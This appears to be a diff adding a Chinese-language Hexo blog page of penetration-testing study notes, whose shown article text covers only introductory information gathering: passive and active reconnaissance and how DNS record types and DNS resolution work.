@@ -1,0 +1,1847 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="奇怪的奇怪">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="信息收集信息收集概述和目的信息收集的方式可以分为两种：被动和主动被动信息收集方式是指利用第三方的服务对目标进行访问了解，例：Google搜索主动信息收集方式通过直接访问 、扫描网站，这种将流量流经网站的行为。比如：nmap扫描端 被动信息收集的目的：通过公开渠道，去获得目标主机的信息，从而不与目标系统直接交互，避免留下痕迹。 信息收集内容 IP地址段  域名信息  邮件地址(社攻，钓鱼)  文档图">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试学习笔记">
+<meta property="og:url" content="http://example.com/2024/06/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="奇怪的亚索">
+<meta property="og:description" content="信息收集信息收集概述和目的信息收集的方式可以分为两种：被动和主动被动信息收集方式是指利用第三方的服务对目标进行访问了解，例：Google搜索主动信息收集方式通过直接访问 、扫描网站，这种将流量流经网站的行为。比如：nmap扫描端 被动信息收集的目的：通过公开渠道，去获得目标主机的信息，从而不与目标系统直接交互，避免留下痕迹。 信息收集内容 IP地址段  域名信息  邮件地址(社攻，钓鱼)  文档图">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/v29ea5b78802807e902ec9122f14f2c994r.jpg">
+<meta property="og:image" content="http://example.com/images/F6AA9A1A37AD4205BE4BF45741BD5AD0.png">
+<meta property="og:image" content="http://example.com/images/D6964F99C6D34a66919DE0FFC5E7912D.png">
+<meta property="og:image" content="http://example.com/images/E051F5AD6F374ae68BBFE85A3429570B.png">
+<meta property="og:image" content="http://example.com/images/D0842BB8A0674d03B6E662ECD196E626.png">
+<meta property="og:image" content="http://example.com/images/4450A6200B92436bACB3AE910C213E8C.png">
+<meta property="og:image" content="http://example.com/images/E72187F43B2042e09E864C20660F2CF9.png">
+<meta property="og:image" content="http://example.com/images/E3FA34FBA2FF4a8b92F5221FA48CF83C.png">
+<meta property="og:image" content="http://example.com/images/00988EF783D14d4f94C33F7078143299.png">
+<meta property="og:image" content="http://example.com/images/16D8B877603E4211914A55B96765E901.png">
+<meta property="og:image" content="http://example.com/images/198D87E3A3F421599274B72D5D2C883.png">
+<meta property="og:image" content="http://example.com/images/CE96DA289BC94c9b86C1DA1BD028197A.png">
+<meta property="og:image" content="http://example.com/images/ADDD9BE3828647d0BECA9146D637A5A3.png">
+<meta property="og:image" content="http://example.com/images/AC436981EB9948d481A627CCF98EBB23.png">
+<meta property="og:image" content="http://example.com/images/20E2D9109CFF418aA52E1C6FC8A29E04.png">
+<meta property="og:image" content="http://example.com/images/035DB6F741CC4084AA39025A7B05CD03.png">
+<meta property="og:image" content="http://example.com/images/B1F36CC4B2BF41e2A2D680F870AF994D.png">
+<meta property="og:image" content="http://example.com/images/69C3A042BC384e7eBC9AFBB17987F3A4.png">
+<meta property="og:image" content="http://example.com/images/8628BFE53BDB43f78D14FD620607FF91.png">
+<meta property="og:image" content="http://example.com/images/5EDA4DDE2BBC4fa0A768DE8A6482E5E1.png">
+<meta property="og:image" content="http://example.com/images/D8EF77F6051549e09E94B3B4343E8C2E.png">
+<meta property="og:image" content="http://example.com/images/D3F555CCC6434f58AC69E07A45214E05.png">
+<meta property="og:image" content="http://example.com/images/0BB48D2AE7EC450aA20383FE966B6366.png">
+<meta property="og:image" content="http://example.com/images/BA6AD4A4DB5A4db2AC85123DF62A07F4.png">
+<meta property="og:image" content="http://example.com/images/DB8BC54F91BD499e9F8741B4FEB15B2.png">
+<meta property="og:image" content="http://example.com/images/36F8D1998A1249b2AD0E0F01836A3B5B.png">
+<meta property="og:image" content="http://example.com/images/40B0D889931F448bA6B4A869D2FEA444.png">
+<meta property="og:image" content="http://example.com/images/B02567C1F1134994A14B29D5F59D4D12.png">
+<meta property="og:image" content="http://example.com/images/B1AE2F3E8FDA46ee9F75ECCE0D227E6B.png">
+<meta property="og:image" content="http://example.com/images/A42119E134B846b6AC997567B0F2CD8B.png">
+<meta property="og:image" content="http://example.com/images/0F2FF3014FD64b1a82016803AF6AA8A2.png">
+<meta property="og:image" content="http://example.com/images/56CE38828FFF427cADB708BFD4186271.png">
+<meta property="og:image" content="http://example.com/images/BA789978144A430e94F7B2E14C2364C9.png">
+<meta property="og:image" content="http://example.com/images/94D96BC9405345bdA95159882FC82221.png">
+<meta property="og:image" content="http://example.com/images/1E5F67C43050435c8DA9F47D51870BC8.png">
+<meta property="og:image" content="http://example.com/images/D238C663779B4416917D9FC7B0B1B254.png">
+<meta property="og:image" content="http://example.com/images/D83FA6549C0343ffA93E0C0F998B4E45.png">
+<meta property="og:image" content="http://example.com/images/6102769AC60948d989315AD1559A2569.png">
+<meta property="og:image" content="http://example.com/images/B1BB3A97737B4208A28D5E821231B1B4.png">
+<meta property="og:image" content="http://example.com/images/6F9245C1634D4f23AA33E06FD5856F8E.png">
+<meta property="og:image" content="http://example.com/images/1BA4CB4080E84793A1F1F1D81C9A3D77.png">
+<meta property="og:image" content="http://example.com/images/899B9C2053D64ce49BFB949F074834B0.png">
+<meta property="og:image" content="http://example.com/images/A5B23482FC8446ed86FD789F5FC8FD12.png">
+<meta property="og:image" content="http://example.com/images/677A0C60C5C144d7B931C021114F7360.png">
+<meta property="og:image" content="http://example.com/images/24CEB3A05A9B43f2875428D868295CFF.png">
+<meta property="og:image" content="http://example.com/images/EF338AB5EB8D4b32849506C552B7F9E2.png">
+<meta property="og:image" content="http://example.com/images/60684AD1D5F2497397A653FF81646A1A.png">
+<meta property="og:image" content="http://example.com/images/A31000CEC78C4d71BA90E481F5EDCC12.png">
+<meta property="og:image" content="http://example.com/images/E8FD04A6A845455dAA73A09308EED2CF.png">
+<meta property="og:image" content="http://example.com/images/DDEAAB1CD27342c4A703733A1A096E09.png">
+<meta property="og:image" content="http://example.com/images/65252D7C918F464f9ECF767FB8227C4D.png">
+<meta property="og:image" content="http://example.com/images/B776173511FB4dd2893460E739A986C2.png">
+<meta property="og:image" content="http://example.com/images/9E5ECCB1823D42538ABA994BE1C0A4A4.png">
+<meta property="og:image" content="http://example.com/images/114190BA9117408eA7CE5D8D2FB707F6.png">
+<meta property="og:image" content="http://example.com/images/34EF3E91898749a9B8E70ED028D60A79.png">
+<meta property="og:image" content="http://example.com/images/B25D68E392574b969CC66C46B768AC74.png">
+<meta property="og:image" content="http://example.com/images/58FEE3B671B5440d9FBDE50EEE1E1EFE.png">
+<meta property="og:image" content="http://example.com/images/D5B05225B41049ae942A0CF1BF1C49C4.png">
+<meta property="og:image" content="http://example.com/images/C79C096949FE481b859B67CF73DA2494.png">
+<meta property="og:image" content="http://example.com/images/87D07AAEE91E48758B1679B3F6E8DB35.png">
+<meta property="og:image" content="http://example.com/images/9AC7520530C84517A8B34B449585F14F.png">
+<meta property="og:image" content="http://example.com/images/4BD07D5B4E6B416aA2E0AEB9E06021EF.png">
+<meta property="og:image" content="http://example.com/images/E0D5E817C1A4a96A268867B3245EBB3.png">
+<meta property="og:image" content="http://example.com/images/85D370A5FDB04d8fADB6499703C25C80.png">
+<meta property="og:image" content="http://example.com/images/23BEE376E6E94b3fB9F42315C5105C12.png">
+<meta property="og:image" content="http://example.com/images/E89206766F0242acB0EB13D2491E1E3F.png">
+<meta property="og:image" content="http://example.com/images/9C994AE89616486a89298DE3F5629628.png">
+<meta property="og:image" content="http://example.com/images/83D0822D133B404aA8EB12DCAE80FC9B.png">
+<meta property="og:image" content="http://example.com/images/CF2F95899F764a7286FBDA0B7503B57C.png">
+<meta property="og:image" content="http://example.com/images/C535733643C54370A472ADF5649EDE60.png">
+<meta property="og:image" content="http://example.com/images/5F7EFFAC3EE22e38F345425BDD690A3.png">
+<meta property="og:image" content="http://example.com/images/8BE3178251D9431f9FAE91E40F51F4D3.png">
+<meta property="og:image" content="http://example.com/images/53D83F17EE634c1390AB06ED6035E2FB.png">
+<meta property="og:image" content="http://example.com/images/DC0F76EA35A0436193312A87E926FC1C.png">
+<meta property="og:image" content="http://example.com/images/17396658C6244eb9B47887D2BC490E59.png">
+<meta property="og:image" content="http://example.com/images/66D2EE5CCCE84475A2D8E4CA6C8F1776.png">
+<meta property="og:image" content="http://example.com/images/0FEFF0FC4ECB4f36AE6A708473AD4F9F.png">
+<meta property="og:image" content="http://example.com/images/43CB4AE4F585401dA5F5E148F07C6C85.png">
+<meta property="og:image" content="http://example.com/images/E8D8BC62729745399D25368D0040406.png">
+<meta property="og:image" content="http://example.com/images/EC22A486E1CF4e4eB0B4C3BEBB8FAC75.png">
+<meta property="og:image" content="http://example.com/images/8515713C8E724a6c9DBB9EA25B8468BF.png">
+<meta property="og:image" content="http://example.com/images/FAF1E0D5F91445eaBB30CFCD1A42EF65.png">
+<meta property="og:image" content="http://example.com/images/155E8D3AB70942d9B9D961D3C4621702.png">
+<meta property="og:image" content="http://example.com/images/655B970225F74dfeAD8D1D02EC8084F.png">
+<meta property="og:image" content="http://example.com/images/E891FFD7BDD54c5aB884C209BAC4B26E.png">
+<meta property="og:image" content="http://example.com/images/02DD4F1133BE45768040EF54EEAEC14D.png">
+<meta property="og:image" content="http://example.com/images/2C736CC0D29240d89D15768E0CA773C3.png">
+<meta property="og:image" content="http://example.com/images/08119D4AF62F436b9426656315C2E5F5.png">
+<meta property="og:image" content="http://example.com/images/09B9C04173D94eb3846B6631FB472CFC.png">
+<meta property="og:image" content="http://example.com/images/4EB8C2B91E154d18A18A00184BF9868F.png">
+<meta property="og:image" content="http://example.com/images/685D4CE0E34E4a4eA0E10920F82F634B.png">
+<meta property="og:image" content="http://example.com/images/84B810076A0F457f869C88926CDAF2CD.png">
+<meta property="og:image" content="http://example.com/images/B348C53CDDE14721A23D3D8A2EA1F02A.png">
+<meta property="og:image" content="http://example.com/images/A9672BC8186049d0B1C43F666959A55B.png">
+<meta property="og:image" content="http://example.com/images/4F354F0A7BD94a038EA4C5B37F4C77ED.png">
+<meta property="og:image" content="http://example.com/images/4CD24928C3C348fbB42E0F7E2B5B8A69.png">
+<meta property="og:image" content="http://example.com/images/28EA649B719543b0951BDCF1050B2DC9.png">
+<meta property="og:image" content="http://example.com/images/B6965E32EE924355959DEAAAB7DE022D.png">
+<meta property="og:image" content="http://example.com/images/784FCE2CEE15496c8070D7B946428BCB.png">
+<meta property="og:image" content="http://example.com/images/1E663CB97B7C4023B7F15CBAAE3742B4.png">
+<meta property="og:image" content="http://example.com/images/F0B30967A3B84e64B47E10F812FFBFE7.png">
+<meta property="og:image" content="http://example.com/images/FD03C88C562240b3ADF71221D06C1746.png">
+<meta property="og:image" content="http://example.com/images/3B7B3171120248ceBFFB088316F3C0BC.png">
+<meta property="og:image" content="http://example.com/images/18B6C5FD4C124830BE71E5FD101B8A0D.png">
+<meta property="og:image" content="http://example.com/images/4E00F94B86BD4039B9DFC46581C672CC.png">
+<meta property="og:image" content="http://example.com/images/743BDEA0B0634b50A88BEFE97F028675.png">
+<meta property="og:image" content="http://example.com/images/25401BFA7ED84bad99B3E9E14AFFBAFA.png">
+<meta property="og:image" content="http://example.com/images/ABFA559964274a6dAD09907551D71862.png">
+<meta property="og:image" content="http://example.com/images/968BF26CD5CE404492FE323C45D5296B.png">
+<meta property="og:image" content="http://example.com/images/E5FB453AFADA42c9B63FEBD3D76CA8EA.png">
+<meta property="og:image" content="http://example.com/images/0F413627BEBD4cb691E7BF20037C78E2.png">
+<meta property="og:image" content="http://example.com/images/5CFF04620E614fc3B590D7B027B556AD.png">
+<meta property="og:image" content="http://example.com/images/7D43C1C694D24840AB04CA0213AE16C9.png">
+<meta property="og:image" content="http://example.com/images/55698E82272A4d10A8A99E195F34E3DE.png">
+<meta property="og:image" content="http://example.com/images/B6150C4D738341fdB820DE48E515F1C7.png">
+<meta property="og:image" content="http://example.com/images/C9A0397B3EF54b6a9216E3EB14EB4F9E.png">
+<meta property="og:image" content="http://example.com/images/EE88FC7A4289401899E85D4E1B6FE642.png">
+<meta property="og:image" content="http://example.com/images/6ED10ED487D7488cB379FEF4F6A7A886.png">
+<meta property="og:image" content="http://example.com/images/D597DB3C1FDA4f24B77552BF33733A88.png">
+<meta property="og:image" content="http://example.com/images/25C9C4BE158C4a0f8FB73D7F72F1A346.png">
+<meta property="og:image" content="http://example.com/images/35E51B1CFAA949a58AD0BFF212645B10.png">
+<meta property="og:image" content="http://example.com/images/35157E2F7D9C4e4eB029F2AB25F8E864.png">
+<meta property="og:image" content="http://example.com/images/5632E524C88D42beB877AF92C2544207.png">
+<meta property="og:image" content="http://example.com/images/1EBE773ECB0A4d62964EB0F065E54E4C.png">
+<meta property="og:image" content="http://example.com/images/D4C633F12B27499f9578A730A945BE7E.png">
+<meta property="og:image" content="http://example.com/images/6346316EDCE047c3944BE0D95E413828.png">
+<meta property="og:image" content="http://example.com/images/A018DDF6EED849bb9EC68D6B65CD4A4F.png">
+<meta property="og:image" content="http://example.com/images/ABDF81285B1A46288D6832E0FACCBF49.png">
+<meta property="og:image" content="http://example.com/images/74679308A9024ffeA1AEE09B4F6119CF.png">
+<meta property="og:image" content="http://example.com/images/007CAE31467D47ebBD94BE9AFCBEB7E1.png">
+<meta property="og:image" content="http://example.com/images/0BE77784C2AA4412A88D04FB6E271BCC.png">
+<meta property="og:image" content="http://example.com/images/E39335FBF7E84071A67B7053153BFCDC.png">
+<meta property="og:image" content="http://example.com/images/2C216426F3A5451aA54F3C4B143BBAF1.png">
+<meta property="og:image" content="http://example.com/images/0EC10B3B9978405098DBF9D2385E6CF7.png">
+<meta property="og:image" content="http://example.com/images/6CC0D8274F5044b3ADC749F248EE4A17.png">
+<meta property="og:image" content="http://example.com/images/FA8434C7011F4722937C7F3EB7A626CD.png">
+<meta property="og:image" content="http://example.com/images/C1A27527AB234fbb9354438B1E4DD18F.png">
+<meta property="og:image" content="http://example.com/images/98A244A798D14722A99F1FCCB37474F5.png">
+<meta property="og:image" content="http://example.com/images/AAFBDA1560A34550A3EFA11FD50FBE04.png">
+<meta property="og:image" content="http://example.com/images/BD3851F733044accB8198663078FBCD9.png">
+<meta property="og:image" content="http://example.com/images/2D692BC2294F4b02A2C508748B7F9581.png">
+<meta property="og:image" content="http://example.com/images/97482BC969A24f4bA87966F081FCC1F6.png">
+<meta property="og:image" content="http://example.com/images/4F9A12A47A4C4fa892D15193445A1AA1.png">
+<meta property="og:image" content="http://example.com/images/B5D4C45CA3C74249BA9716BCC0DC1BDA.png">
+<meta property="og:image" content="http://example.com/images/D1791FDEEC144b3fB15F666C4438E6E5.png">
+<meta property="og:image" content="http://example.com/images/D6E45A8A730B445592276CD1762B6898.png">
+<meta property="og:image" content="http://example.com/images/BAAD848AB5E4a82B80B878A303641A8.png">
+<meta property="og:image" content="http://example.com/images/F875837E77F746b183185D0045AA007D.png">
+<meta property="og:image" content="http://example.com/images/6A1E1E84B86844449F60EA7CDFA63BA3.png">
+<meta property="og:image" content="http://example.com/images/1666D1F82092401f8DE3AF261043650E.png">
+<meta property="og:image" content="http://example.com/images/483A84725E614ea993814C3E802051EA.png">
+<meta property="og:image" content="http://example.com/images/D6403343CA074ea883791BE1F5F81209.png">
+<meta property="og:image" content="http://example.com/images/C997AF3AA9D44b6693895B2B1A008F8B.png">
+<meta property="og:image" content="http://example.com/images/2534C352E603476886ED1DD8705420F5.png">
+<meta property="og:image" content="http://example.com/images/A60AB414CA5443259749E75475A0DD96.png">
+<meta property="og:image" content="http://example.com/images/81F72D26020D4026A2436A1C875E0CC1.png">
+<meta property="og:image" content="http://example.com/images/0DEFF9FAFF9C44a3A548FAAABFB33F1F.png">
+<meta property="og:image" content="http://example.com/images/576E034E3AFD452f82B29FA59C01DC19.png">
+<meta property="og:image" content="http://example.com/images/3A8EA08F4C914c14A9766DF07A6CE150.png">
+<meta property="og:image" content="http://example.com/images/DC26EB19F2EA4bafA5D0C41FDF269868.png">
+<meta property="og:image" content="http://example.com/images/FDB26B04BF6F4a86B39822D237456721.png">
+<meta property="og:image" content="http://example.com/images/08C257EB19C44323B1F8B17475F3783E.png">
+<meta property="og:image" content="http://example.com/images/BC461FDF582D4abd889CE55589D16F75.png">
+<meta property="og:image" content="http://example.com/images/72400C29DF4B4bd487DE621D5BF323A4.png">
+<meta property="og:image" content="http://example.com/images/CAFB2BD7A5F64b10B6365A2FB1A7DC8A.png">
+<meta property="og:image" content="http://example.com/images/351A5F4DEF29412d9A40B472F9AABF39.png">
+<meta property="og:image" content="http://example.com/images/60B0C1682C6E4a1bA20EB3EDAF0695A5.png">
+<meta property="og:image" content="http://example.com/images/4290ED89D3F94695A6A0D31610BAEC64.png">
+<meta property="article:published_time" content="2024-06-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-08T15:31:03.318Z">
+<meta property="article:author" content="奇怪的奇怪">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/v29ea5b78802807e902ec9122f14f2c994r.jpg">
+  
+  
+  
+  <title>渗透测试学习笔记 - 奇怪的亚索</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","app_key":"2jVxSBuNhzKC1JEOZN2aZTgr","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>奇怪的亚索</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="渗透测试学习笔记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-24 00:00" pubdate>
+          2024年6月24日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          37k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          305 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">渗透测试学习笔记</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="信息收集概述和目的"><a href="#信息收集概述和目的" class="headerlink" title="信息收集概述和目的"></a>信息收集概述和目的</h2><p>信息收集的方式可以分为两种：被动和主动<br><strong>被动信息收集方式</strong>是指利用第三方的服务对目标进行访问了解，例：Google搜索<br><strong>主动信息收集方式</strong>通过直接访问 、扫描网站，这种将流量流经网站的行为。比如：nmap扫描端</p>
+<p>被动信息收集的目的：通过公开渠道，去获得目标主机的信息，从而不与目标系统直接交互，避免留下痕迹。</p>
+<h3 id="信息收集内容"><a href="#信息收集内容" class="headerlink" title="信息收集内容"></a>信息收集内容</h3><ol>
+<li><p>IP地址段</p>
+</li>
+<li><p>域名信息</p>
+</li>
+<li><p>邮件地址(社攻，钓鱼)</p>
+</li>
+<li><p>文档图片数据</p>
+</li>
+<li><p>公司地址</p>
+</li>
+<li><p>公司组织架构</p>
+</li>
+<li><p>联系电话&#x2F;传真号码</p>
+</li>
+<li><p>人员姓名&#x2F;职务</p>
+</li>
+<li><p>目标系统使用的技术架构</p>
+</li>
+<li><p>公开的商业信息</p>
+</li>
+</ol>
+<h3 id="信息用途"><a href="#信息用途" class="headerlink" title="信息用途"></a>信息用途</h3><ol>
+<li><p>信息描述目标</p>
+</li>
+<li><p>发现目标</p>
+</li>
+<li><p>社会工程学攻击</p>
+</li>
+<li><p>物理缺口</p>
+</li>
+</ol>
+<h2 id="信息收集-DNS"><a href="#信息收集-DNS" class="headerlink" title="信息收集-DNS"></a>信息收集-DNS</h2><h3 id="域名解析原理"><a href="#域名解析原理" class="headerlink" title="域名解析原理"></a>域名解析原理</h3><ol>
+<li><p>DNS服务器概述</p>
+<p> 运行DNS服务器程序的计算机，储存DNS数据库信息。DNS服务器分为根域DNS服务器、顶级域名DNS服务器、根域DNS服务器有13个，都存储了全部的顶级域名服务器的所在地址；顶级域名服务器存储了每位客户所注册的主机地址，这里对应到163.com这个级别。(域名解析到对应的IP解析的记录存储在DNS服务器中)</p>
+</li>
+<li><p>域名记录：A, Cname, NS, MX , PTR</p>
+<p> (1). A记录(Address)正向解析<br> A记录是将一个主机名(全称域名FQDN)和一个IP地址关联起来，这也是大多数客户端程序默认的查询类型。例：zijie.love -&gt; 185.199.x.x(github)</p>
+<p> (2). PTR记录(Pointer)反向解析<br> PTR记录将一个IP地址对应到主机名(全称域名FQDN)。这些记录保存在in-addr.arpa域中。(IP解析-&gt;域名)<br> (3). CNAME 记录(Canonical Name)别名<br> 别名记录，也称为规范名字(Canonical Name),这种记录允许您将多个名字映射到同一台计算机。(多个域名映射到同一台计算机)<br> 例：zijie.love对应IP 8.8.8.6 ，webdog.zijie.love对应IP 8.8.8.6</p>
+<p> (4). MX 记录(Mail eXchange)<br> MX记录是邮件交换记录，它指向一个邮件服务器，用于电子邮件系统发邮件时根据 收信人的地址后缀来定位邮件服务器。<br> 例：mail.zijie.com(mail开头的邮件服务器)<br> 当有多个MX记录(即有多个邮件服务器时)，则需要设置数值来确定其优先级。通过设置优先级数字来指明首选服务器,数字越小表示优先级越高。<br> (5). NS记录(Name Server)<br> NS(Name Server) 记录是域名服务器记录，也称为授权服务器，用来指定该域名由哪个DNS服务器来进行解析。<br> 例：dns.zijie.cn</p>
+</li>
+<li><p>DNS缓存服务器<br> 缓存DNS服务器：不负责解析域，只是缓存域名解析结果。(缓存后直接读结果，更加快速)</p>
+<p> DNS查询方式：递归查询和迭代查询<br> 一个DNS查询过程，通过8个步骤的解析过程就使得客户端可以顺利访问<a target="_blank" rel="noopener" href="http://www.163.com这个域名,但实际应用中,通常这个过程是非常迅速的,如图/">www.163.com这个域名，但实际应用中，通常这个过程是非常迅速的，如图</a><br> <img src="/images/v29ea5b78802807e902ec9122f14f2c994r.jpg" srcset="/img/loading.gif" lazyload><br> <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/588861435">一张图看懂DNS域名解析全过程</a></p>
+</li>
+</ol>
+<h4 id="DNS查询过程"><a href="#DNS查询过程" class="headerlink" title="DNS查询过程"></a>DNS查询过程</h4><ol>
+<li><p>浏览器缓存:当用户通过浏览器访问某域名时，浏览器首先会在自己的缓存中查找是否有该域名对应的IP地址(若曾经访问过该域名且没有清空缓存便存在)</p>
+</li>
+<li><p>系统缓存：当浏览器缓存中无域名对应IP则会自动检查用户计算机系统Hosts文件DNS缓存是否有该域名对应IP</p>
+</li>
+<li><p>路由器缓存：当浏览器及系统缓存中均无域名对应IP则进入路由器缓存中检查，以上三步均为客户端的DNS缓存</p>
+</li>
+<li><p>ISP(互联网服务提供商) DNS缓存(一般就是本地DNS服务器)：当在用户客户端查找不到域名对应IP地址，则将进入ISP DNS缓存中进行查询。比如你用的是电信的网络，则会进入电信的DNS缓存服务器中进行查找</p>
+</li>
+<li><p>根域名服务器：当以上均未完成，则进入根服务器进行查询。全球仅有13台根域名服务器，1个主根域名服务器，其余12为辅根域名服务器。根域名收到请求后会查看区域文件记录，若无则将其管辖范围内顶级域名(如.com)服务器IP告诉本地DNS服务器。</p>
+</li>
+<li><p>顶级域名服务器：顶级域名服务器收到请求后查看区域文件记录，若无则将其管辖范围内主域名服务器的IP地址告诉本地DNS服务器。</p>
+</li>
+<li><p>主域名服务器：主域名服务器接收到请求后查询自己的缓存，如果没有则进入下一级域名服务器进行查找，并重复该步骤直至找到正确记录</p>
+</li>
+<li><p>保存结果至缓存：本地域名服务器把返回的结果保存到缓存，以备下一次使用，同时将该结果反馈给客户端，客户端通过这个IP地址与web服务器建立连接。</p>
+</li>
+</ol>
